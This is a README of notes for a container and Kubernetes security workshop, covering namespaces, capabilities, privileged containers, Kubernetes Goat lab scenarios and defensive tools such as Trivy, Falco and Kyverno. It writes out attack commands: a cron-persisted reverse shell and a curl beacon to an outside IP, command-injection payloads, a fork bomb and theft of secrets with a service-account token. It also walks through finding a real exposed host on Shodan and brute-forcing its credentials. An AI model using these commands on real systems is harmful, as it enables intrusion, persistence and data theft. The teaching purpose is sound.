# Complete 2.5 hours of workshop recording is up on YouTube 

[![Container-and-Kubernetes-Security-Workshop](https://pbs.twimg.com/media/FZHQG5eXkAAmTWu?format=jpg&name=large)](https://www.youtube.com/watch?v=ka0C09CAfho)

# container-and-kubernetes-security-workshop-notes

## About me

https://rewanthtammana.com/

## Notes

### Sample attacks & hacks across the globe

Kubernetes hacks doesn't have to be just a misconfiguration in kubernetes. Any vulnerability in the applications running on top of Kubernetes lead to entire system compromise. A few hacks:

* https://www.bleepingcomputer.com/news/security/over-900-000-kubernetes-instances-found-exposed-online/
* https://www.wired.com/story/cryptojacking-tesla-amazon-cloud/
* https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/
* https://sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu/
* https://thehackernews.com/2022/05/yes-containers-are-terrific-but-watch.html
* https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/tesla-and-jenkins-servers-fall-victim-to-cryptominers
* https://thehackernews.com/2022/07/over-1200-npm-packages-found-involved.html
* https://threatpost.com/380k-kubernetes-api-servers-exposed-to-public-internet/179679/
* https://www.bleepingcomputer.com/news/security/jenkins-discloses-dozens-of-zero-day-bugs-in-multiple-plugins/

### Live session on how it's done

Everyday you see many hacks happening on the internet but you might not be sure how it happens. I will show a demonstration on how it's done end-to-end!

https://www.shodan.io/

You can get the pro account for $5 for life time & it's worth it.

Query - port:4040 country:"IN" city:"Mumbai"

You can use their developer guide to write scripts to scrape the data, etc.

https://github.com/JavierOlmedo/shodan-filters

https://www.shodan.io/host/65.0.72.126

You can use tools like https://github.com/xmendez/wfuzz or simple bash scripts to brute force the username & password

Most popular username & password dump: https://github.com/danielmiessler/SecLists


https://github.com/weaveworks/scope

```bash
apk add libcap
capsh --print
```

```bash
find / -name docker.sock
apk add docker
```

We can run privileged containers, containers with hostpid, hostipc, etc. We can gain access to the host machine, run things around, run crypto miners silently in the background, and lot more. We can even leverage capablities like CAP_SYS_ADMIN, CAP_SYS_MODULE, CAP_SYS_RAWIO, CAP_NET_ADMIN, etc.

You can also use tools like `nsenter` to create namespaces in linux or even hook into one of the parent processes running on the host & break out of the container

```bash
which nsenter
```

How to know if we are inside a container or on a host machine?

```bash
ls -l /var/lib/docker
```

```bash
docker run --rm -it -v /:/abcd ubuntu bash
# ls -l /abcd/var/lib/docker
# hostname
```

Let's leverage the functionality of cronjob in linux to get a reverse shell. Few techniques to get a reverse shell are given here: https://highon.coffee/blog/reverse-shell-cheat-sheet/


![Reverse shell](https://miro.medium.com/max/1400/1*CyVqkmA7wLYaippCGRXW5w.jpeg)
Reference: https://systemweakness.com/a-persistent-reverse-shell-on-macos-40fb65b3dacf?gi=70e6704f4f9e

```bash
docker run --rm -it -v /:/abcd ubuntu bash
# ls -l /abcd/var/lib/docker
# hostname
# echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /abcd/tmp/run.sh
# chmod +x /abcd/tmp/run.sh
# echo "*  *    * * *   root    bash /tmp/run.sh" >> /abcd/etc/crontab
# echo '*  *    * * *   root    curl 18.141.250.7:8000/test/$(hostname)' >> /abcd/etc/crontab
```

On `18.141.250.7`, wait for incoming connection

```bash
nc -nlvp 8888
```

### Attack Mitre framework

![https://images.contentstack.io/v3/assets/blt300387d93dabf50e/blt79d91d9e7404f336/629d981961670f0fb5dd1161/MITTRE_ATTACK_Metric.png](https://images.contentstack.io/v3/assets/blt300387d93dabf50e/blt79d91d9e7404f336/629d981961670f0fb5dd1161/MITTRE_ATTACK_Metric.png)
Reference: https://www.weave.works/blog/mitre-attack-matrix-for-kubernetes

We cannot discuss all stages in one session. We will try to touch one topic from each category. But first we must learn about containers!

### Container?

Isolation in the same system with unique namespaces.

* PID    - Isolation of process ids
* User   - Isolation of users & UIDs
* Mount  - Isolation of mount points
* Net    - Isolation of networking interfaces & environment
* UTS    - Isolation of hostname
* IPC    - Isolation of IPC traffic
* Cgroup - Isolation of cgroups (memory & cpu)

https://github.com/rewanthtammana/containers-from-scratch/blob/master/main.go#L32

```bash
docker run --rm -it ubuntu bash
# sleep 1d
```

```bash
ps -ef | grep sleep 1d
ls /proc/<PID>/ns
```

You can see the docker container namespaces! In real all the data, processes, etc are existing on the host machine.

```bash
docker run --name debugcontainer --rm -it ubuntu bash
# echo "inside container" > file.txt
```

```bash
docker inspect debugcontainer | grep -i upperdir
```

In `docker inspect`, you will see the below fields.

`LowerDir`: contains the files of the base system
`UpperDir`: all changes to the base system are stored in `upperDir` 

```bash
docker inspect debugcontainer | grep -i upperdir
cat <upperdir>/file.txt
```

Viola! The file you created inside the container is accessible from the host machine.

### What does it mean to be root inside a container?

You can run these on killercoda!

**Root on host machine & root inside container**

```bash
$ docker run --rm -it nginx bash
# sleep 1d
```

```bash
$ ps -ef | grep sleep
```

**Non-root on host machine & root inside container**

```bash
$ adduser ubuntu
$ sudo chown ubuntu:ubuntu /var/run/docker.sock
$ su - ubuntu
$ docker run --rm -it nginx bash
# sleep 2d
```

```bash
$ ps -ef | grep sleep
```

**Root on host machine & non-root inside container**

```bash
$ docker run --rm --user 1000:1000 -it nginx bash
# sleep 3d
```

```bash
$ ps -ef | grep sleep
```

Since docker daemon runs as root, eventually all the processes triggered by it run as root. Another example -

```bash
echo "I'm root" >> /tmp/groot.txt
chmod 0600 /tmp/groot.txt
su - ubuntu
cat /tmp/groot.txt
```

```bash
docker run --rm -it -v /tmp/groot.txt:/tmp/groot.txt nginx cat /tmp/groot.txt
docker run --rm -it -u 1000:1000 -v /tmp/groot.txt:/tmp/groot.txt nginx cat /tmp/groot.txt
```

When the user inside the container is non-root, even if the container gets compromised, the attacker cannot read the mounted sensitive files unless they have the appropriate permissions or escalate the privileges.

### Privileged container

Kernel files are crucial on host machine, let's see if we can mess with that.

https://github.com/torvalds/linux/blob/v5.0/Documentation/sysctl/vm.txt#L809

```bash
$ cat /proc/sys/vm/swappiness
$ docker run --rm --privileged -it ubuntu bash
# cat /proc/sys/vm/swappiness
60
# echo 10 > /proc/sys/vm/swappiness
$ cat /proc/sys/vm/swappiness
```

These kind of changes to the kernel files can create DoS attacks!

Let's say you got access to one of the containers by exploiting an application or some other means. How will you identify if you are inside a privileged or normal container? There are many ways! A few of them are!

Run two containers, one normal & one privileged

```bash
docker run --rm -it ubuntu bash
docker run --rm --privileged -it ubuntu bash
```

1. Check for mount permissions & masking
    ```bash
    mount | grep 'ro,'
    mount | grep /proc.*tmpfs
    ```
1. Linux capablities - we will see more about it in the next section!
    ```bash
    capsh --print
    ```
1. Seccomp - Limit the syscalls
    ```bash
    grep Seccomp /proc/1/status
    ```

### Capablities

https://command-not-found.com/capsh
https://man7.org/linux/man-pages/man7/capabilities.7.html
https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/

```bash
capsh --print
```

```bash
grep Cap /proc/self/status
capsh --decode=<decodeBnd>
```

Demonstrating that the processes inside the container inherits it's capabilities

```bash
$ docker run --rm -it ubuntu sleep 1d &
$ ps aux | grep sleep
$ grep Cap /proc/<pid>/status
$ capsh --decode=<value>
```

```bash
$ docker run --rm --privileged -it ubuntu sleep 2d &
$ ps aux | grep sleep
$ grep Cap /proc/<pid>/status
$ capsh --decode=<value>
```

```bash
$ docker run --rm --cap-drop=all -it ubuntu sleep 3d &
$ ps aux | grep sleep
$ grep Cap /proc/<pid>/status
$ capsh --decode=<value>
```

**CapEff:** The effective capability set represents all capabilities the process is using at the moment.

**CapPrm:** The permitted set includes all capabilities a process may use.

**CapInh:** Using the inherited set all capabilities that are allowed to be inherited from a parent process can be specified.

**CapBnd:** With the bounding set its possible to restrict the capabilities a process may ever receive.

**CapAmb:** The ambient capability set applies to all non-SUID binaries without file capabilities.

About a few capabilities:

**CAP_CHOWN** - allows the root use to make arbitrary changes to file UIDs and GIDs

**CAP_DAC_OVERRIDE** - allows the root user to bypass kernel permission checks on file read, write and execute operations.

**CAP_SYS_ADMIN** - Most powerful capability. It allows to manage cgroups of the system, thereby allowing you to control system resources

```bash
docker run --rm -it busybox:1.28 ping google.com
```

```bash
docker run --rm --cap-drop=NET_RAW -it busybox:1.28 ping google.com
```

```bash
docker run --rm -it --cap-drop=all ubuntu chown nobody /tmp
docker run --rm -it ubuntu chown nobody /tmp
docker run --rm -it --cap-drop=all --cap-add=chown ubuntu chown nobody /tmp
```

* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
* https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/
* https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd

### Docker socket

We got multiple scenarios in Kubernetes Goat. So, we can do a hands-on session on those scenarios.

Run it on your local machine/cloud instance. For multiple reasons, killercoda isn't working with this project!

If you have Kubernetes, run the below commands!

```bash
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash setup-kubernetes-goat.sh
# Wait for a while to get all services up & running
watch -n 0.1 kubectl get po
bash access-kubernetes-goat.sh
```

If you are on KinD, then

```bash
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat/platforms/kind-setup
bash setup-kind-cluster-and-goat.sh
# Wait for a while to get all services up & running
watch -n 0.1 kubectl get po
bash access-kubernetes-goat.sh
```

Challenges list - http://127.0.0.1:1234/

DIND (docker-in-docker) exploitation - http://127.0.0.1:1231/

On your cloud instance, get ready to catch the reverse shell!

![Reverse shell](https://miro.medium.com/max/1400/1*CyVqkmA7wLYaippCGRXW5w.jpeg)
Reference: https://systemweakness.com/a-persistent-reverse-shell-on-macos-40fb65b3dacf?gi=70e6704f4f9e

```bash
# On your cloud instance
nc -nlvp 8888
```


```bash
127.0.0.1
127.0.0.1;id
127.0.0.1;whoami
127.0.0.1;hostname
127.0.0.1;ls -l
# Get a reverse shell to ease the enumeration
127.0.0.1;echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /tmp/run.sh;cat /tmp/run.sh
127.0.0.1;chmod +x /tmp/run.sh;bash /tmp/run.sh
```

https://highon.coffee/blog/reverse-shell-cheat-sheet/

```bash
nc -nlvp 8888
# you will get a shell here
# look for ambiguiencies in the files
find / -name docker.sock
apt update #But this is taking lots of time for some reason. So, we cannot install docker with apt commands!
# Download docker binary directly to save the time
wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz
tar xvf docker-17.03.0-ce.tgz
cd docker
./docker -H unix:///custom/docker/docker.sock ps
./docker -H unix:///custom/docker/docker.sock images
```

An attacker can replace the existing images with malicious images. The end-user will never get to know & since the image is existing on the local system, the user will use it without any disruption. You can even run privileged containers, mount host system, change the file system, kernel files, & lot more.

docker-socket recon

https://github.com/search?q=%2Fvar%2Frun%2Fdocker.sock+filename%3Adocker-compose.yml+language%3AYAML+language%3AYAML&type=Code&ref=advsearch&l=YAML&l=YAML

One of the results -> https://github.com/domwood/kiwi-kafka/blob/f47f91f5611f2c18694764d812d110b62126c694/scripts/docker-compose-kiwi.yml

docker-compose up

### hostPid

You will have able to access processes running on the same PID namespace. So, you will get access to lots of privileged information.

### hostIpc

Not very dangerous but if any process uses the IPC (Inter Process Communication) on the host/any other container, you can write to those devices! Usually IPC shared memory is in /dev/shm

### hostNetwork

The container will be using the network interface same as host machine. No special IP allocation or something. Since, you have access to the main network interface, you can dump/intercept traffic that's going through the host machine ;)

### Trivy - Scan docker images

https://github.com/aquasecurity/trivy

Visit the latest releases section & install the binary!

```bash
trivy i nginx
```

Since, you have learnt argocd. I will teach you how to fix issues in argocd!

This will not work on killercoda due to disk space constraints, use your local machine to try it!

```bash
git clone https://github.com/argoproj/argo-cd
cd argo-cd
# Errors due to BUILDPLATFORM specification, just remove it from the Dockerfile!
docker build . -t argocd
trivy i argocd
```

It will take sometime to build, so let's review multi-stage builds for a while.

https://github.com/argoproj/argo-cd/blob/master/Dockerfile


Change the base image in the dockerfile, rebuild the argocd image & then scan it. Most of the issues will be sorted out!


https://docs.docker.com/develop/develop-images/multistage-build/

```bash
trivy i ubuntu:22.04
trivy i ubuntu:21.10
trivy i ubuntu:21.04
```


**Distroless images**

https://github.com/GoogleContainerTools/distroless

```bash
trivy i gcr.io/distroless/static-debian11
```

```bash
docker run --rm -it gcr.io/distroless/static-debian11 sh
docker run --rm -it gcr.io/distroless/static-debian11 ls
docker run --rm -it gcr.io/distroless/static-debian11 id
docker run --rm -it gcr.io/distroless/static-debian11 whoami
```

### Analyzing docker images

```bash
docker pull ubuntu
docker inspect ubuntu
```

But the above inspect command will not help you to examine the layers of the docker images

https://github.com/wagoodman/dive

```bash
wget https://github.com/wagoodman/dive/releases/download/v0.9.2/dive_0.9.2_linux_amd64.deb
sudo apt install ./dive_0.9.2_linux_amd64.deb
```

https://github.com/madhuakula/kubernetes-goat

```bash
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash setup-kubernetes-goat.sh
# Wait for a while to get all services up & running
watch -n 0.1 kubectl get po
bash access-kubernetes-goat.sh
```

```bash
kubectl get jobs
kubectl get jobs hidden-in-layers -oyaml
dive madhuakula/k8s-goat-hidden-in-layers
docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar
tar -xvf hidden-in-layers.tar
# Find the layer ID
cd <ID>
tar -xvf layers.tar
cat <whatever-it-is>
```

### DoSing the container - Fork bomb

**DO NOT RUN IN ON YOUR COMPUTER EVER. RUN IN KILLERCODA ONLY**

```bash
:(){ :|:& };:
```

We will do this on killercoda! Get ready to crash your system.

```bash
docker run --name unlimited --rm -it ubuntu bash
docker stats unlimited
```

```bash
docker run --name withlimits --rm -m 0.5Gi --cpus 0.8 -it ubuntu bash
docker stats withlimits
```

### Private registry

Another scenario is kubernetes goat!

Attacking private registry - http://127.0.0.1:1235

You can use tools like dirbuster/gobuster to brute force the list of pages

https://docs.docker.com/registry/spec/api/


```bash
URL="http://127.0.0.1:1235"
curl $URL/v2/
# List all repositories
curl $URL/v2/_catalog
# Get manifest of specific image
curl $URL/v2/madhuakula/k8s-goat-users-repo/manifests/latest
# Try to look for sensitive information in the results
curl $URL/v2/madhuakula/k8s-goat-users-repo/manifests/latest | grep -i env
```

### Dockle

https://github.com/goodwithtech/dockle

**Installation**

```bash
VERSION=$(
 curl --silent "https://api.github.com/repos/goodwithtech/dockle/releases/latest" | \
 grep '"tag_name":' | \
 sed -E 's/.*"v([^"]+)".*/\1/' \
) && curl -L -o dockle.deb https://github.com/goodwithtech/dockle/releases/download/v${VERSION}/dockle_${VERSION}_Linux-64bit.deb
sudo dpkg -i dockle.deb && rm dockle.deb
```

```bash
dockle madhuakula/k8s-goat-users-repo
```

### Runtime security

Falco

https://github.com/falcosecurity/falco

You can try on Killercoda!

```bash
curl -s https://falco.org/repo/falcosecurity-3672BA8F.asc | apt-key add -
echo "deb https://download.falco.org/packages/deb stable main" | tee -a /etc/apt/sources.list.d/falcosecurity.list
apt-get update -y
apt-get -y install linux-headers-$(uname -r)
apt-get install -y falco
falco
```

```bash
docker run --name nginx --rm -it -d nginx
```

```bash
docker exec -it nginx bash
cat /etc/shadow
```

https://github.com/developer-guy/awesome-falco

### NIST framework for containers

https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-190.pdf

## Kubernetes 

### RBAC misconfiguration

Kubernetes Goat -  http://127.0.0.1:1236

```bash
cd /var/run/secrets/kubernetes.io/serviceaccount/
ls -larth
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets | grep -i key
```

Do not mount the serviceaccount token wherever necessary

```bash
kubectl explain po --recursive | grep -i automount
```

With this method, it's hard to understand the positioning of the field, `automountServiceAccountToken`. I created a tool to ease the process, you can try to leverage it.

Install krew first. https://krew.sigs.k8s.io/docs/user-guide/setup/install/

```bash
(
  set -x; cd "$(mktemp -d)" &&
  OS="$(uname | tr '[:upper:]' '[:lower:]')" &&
  ARCH="$(uname -m | sed -e 's/x86_64/amd64/' -e 's/\(arm\)\(64\)\?.*/\1\2/' -e 's/aarch64$/arm64/')" &&
  KREW="krew-${OS}_${ARCH}" &&
  curl -fsSLO "https://github.com/kubernetes-sigs/krew/releases/latest/download/${KREW}.tar.gz" &&
  tar zxvf "${KREW}.tar.gz" &&
  ./"${KREW}" install krew
)
echo PATH="${KREW_ROOT:-$HOME/.krew}/bin:$PATH" >> ~/.bashrc
source ~/.bashrc
kubectl krew
```

https://github.com/rewanthtammana/kubectl-fields

```bash
kubectl krew install fields
```

```bash
kubectl fields pods automount
```

### Network Policies

https://github.com/ahmetb/kubernetes-network-policy-recipes

Show your presentation on compromising organizational security bug! A detailed presentation on million dollar company hack!

https://www.linkedin.com/posts/rewanthtammana_compromising-organizational-systems-through-activity-6931329299434061824-yMcb

If the database connection to the end-user is blocked, then the attack would have never happened.

### Kyverno

Demonstrate on how you can control the deployment configuration

Install Kyverno,

```bash
kubectl create -f https://raw.githubusercontent.com/kyverno/kyverno/main/config/install.yaml
```

```bash
echo '''apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-app-label
spec:
  validationFailureAction: enforce
  rules:
  - name: check-for-app-label
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "label `app` is required"
      pattern:
        metadata:
          labels:
            app: "?*"''' > check-labels.yaml
```

```bash
kubectl apply -f check-labels.yaml
```

```bash
kubectl run nginx --image nginx
kubectl run nginx --image nginx --labels rand=wer
kubectl run nginx --image nginx --labels app=wer
```

### Kubescape

https://github.com/armosec/kubescape

```bash
wget https://github.com/armosec/kubescape/releases/download/v2.0.164/kubescape-ubuntu-latest
chmod +x kubescape-ubuntu-latest
sudo mv kubescape-ubuntu-latest /usr/local/bin/kubescape
```

To gain best results, we can install the vulnerable cluster, kubernetes-goat on killercoda & then trigger the scan.

```bash
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash setup-kubernetes-goat.sh
bash access-kubernetes-goat.sh
```

```bash
kubescape scan
kubescape scan framework nsa
kubescape scan framework nsa -v
kubescape scan framework nsa -v --exclude-namespaces kube-system
```

```bash
kubectl edit deploy system-monitor-deployment
```

### More

There are more things like apparmor, selinux, mutating webhooks, seccomp, service mesh, observability, tracing, & lot more that help to harden a container/Kubernetes environment.

For further reading, you can check my article on how an attacker can gain persistence on kubernetes cluster by exploiting mutating webhooks here - https://blog.rewanthtammana.com/creating-malicious-admission-controllers

Further practice on container internals & security - https://contained.af/

## Follow me

* https://www.linkedin.com/in/rewanthtammana
* https://twitter.com/rewanthtammana
